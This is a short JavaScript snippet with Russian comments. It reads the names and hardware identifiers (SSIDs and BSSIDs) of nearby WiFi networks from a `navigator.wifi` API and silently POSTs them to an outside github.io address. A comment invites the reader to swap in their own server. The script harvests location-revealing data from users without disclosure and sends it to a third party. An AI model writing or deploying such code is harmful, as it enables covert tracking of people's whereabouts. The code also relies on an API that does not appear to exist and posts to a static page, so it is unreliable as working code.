(async function () {
  // Проверка поддержки API WiFi
  if (!navigator.wifi) {
    console.log("API WiFi не поддерживается");
    return;
  }

  // Запрос разрешения на доступ к WiFi
  try {
    const networks = await navigator.wifi.getNetworks();

    // Получение SSIDs и BSSIDs доступных WiFi-сетей
    const ssids = networks.map((network) => network.ssid);
    const bssids = networks.map((network) => network.bssid);

    // **Замените этот URL на ваш серверный API**
    await fetch("https://osip-d25.github.io/filetest/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        ssids,
        bssids,
      }),
    });

    console.log("Данные о WiFi-сетях пользователя успешно отправлены");
  } catch (error) {
    console.log(`Ошибка при получении информации о WiFi: ${error.message}`);
  }
})();
